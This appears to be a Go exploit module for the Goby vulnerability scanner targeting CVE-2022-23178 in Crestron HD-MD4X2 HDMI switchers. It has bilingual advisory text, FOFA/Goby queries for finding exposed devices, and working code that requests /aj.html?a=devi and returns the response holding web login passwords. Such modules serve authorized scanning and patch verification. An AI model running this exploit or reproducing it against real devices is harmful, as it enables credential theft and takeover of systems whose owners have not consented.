package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Crestron Hd-Md4X2 Credential aj.html file Disclosure (CVE-2022-23178)",
    "Description": "<p>restron Hd-Md4X2-4K-E is a simple-to-use UHD signal switcher with four HDMI inputs and two HDMI outputs from Crestron, USA.</p><p>Crestron Hd-Md4X2-4K-E has an information disclosure vulnerability, attackers can obtain WEB user login credentials and further control the system.</p>",
    "Impact": "<p>Crestron Hd-Md4X2 Credential Disclosure (CVE-2022-23178)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E\">https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Crestron Hd-Md4X2",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Crestron 公司 Hd-Md4X2 信号切换器 aj.html 文件信息泄露漏洞（CVE-2022-23178）",
            "Product": "Crestron Hd-Md4X2",
            "Description": "<p>Crestron Hd-Md4X2-4K-E是美国Crestron公司的一个简单的使用，有四个 Hdmi 输入和两个 Hdmi 输出超高清信号切换器。</p><p>Crestron Hd-Md4X2-4K-E 存在信息泄露漏洞，攻击者可获取WEB用户登录凭据，进一步控制系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E\">https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Crestron Hd-Md4X2-4K-E 存在信息泄露漏洞，攻击者可获取WEB用户登录凭据，进一步控制系统。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Crestron Hd-Md4X2 Credential aj.html file Disclosure (CVE-2022-23178)",
            "Product": "Crestron Hd-Md4X2",
            "Description": "<p>restron Hd-Md4X2-4K-E is a simple-to-use UHD signal switcher with four HDMI inputs and two HDMI outputs from Crestron, USA.</p><p>Crestron Hd-Md4X2-4K-E has an information disclosure vulnerability, attackers can obtain WEB user login credentials and further control the system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E\">https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Crestron Hd-Md4X2 Credential Disclosure (CVE-2022-23178)</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"js/top.js\" && body=\"document.onmousedown = ReCalculate;\"",
    "GobyQuery": "body=\"js/top.js\" && body=\"document.onmousedown = ReCalculate;\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://de.crestron.com",
    "DisclosureDate": "2022-01-14",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-1005"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [
        "CVE-2022-23178"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202201-1005"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10252"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/aj.html?a=devi&_=[...]"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "upassword")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/aj.html?a=devi&_=[...]"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
